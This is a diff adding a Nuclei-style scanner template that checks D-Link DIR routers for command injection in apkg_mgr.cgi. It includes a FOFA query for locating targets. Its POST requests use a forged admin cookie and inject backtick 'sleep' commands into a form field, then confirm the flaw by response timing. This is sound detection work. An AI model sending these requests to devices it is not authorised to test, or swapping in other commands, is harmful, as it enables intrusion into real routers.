@@ -1,0 +1,46 @@
+id: d-link-apkg-mgr-cgi-rce
+
+info:
+  name: "D-Link apkg_mgr.cgi等接口远程命令执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: "D-Link-DIR"
+  tags: D-Link
+
+http:
+- raw:
+  - |
+    POST /cgi-bin/apkg_mgr.cgi HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    X-Requested-With: XMLHttpRequest
+    Cookie: username=admin
+    Connection: close
+
+    cmd=module_enable_disable&f_module_name=`sleep 5`&f_enable=&f_web=
+  - |
+    POST /cgi-bin/apkg_mgr.cgi HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    X-Requested-With: XMLHttpRequest
+    Cookie: username=admin
+    Connection: close
+
+    cmd=module_enable_disable&f_module_name=`sleep 8`&f_enable=&f_web=
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
+
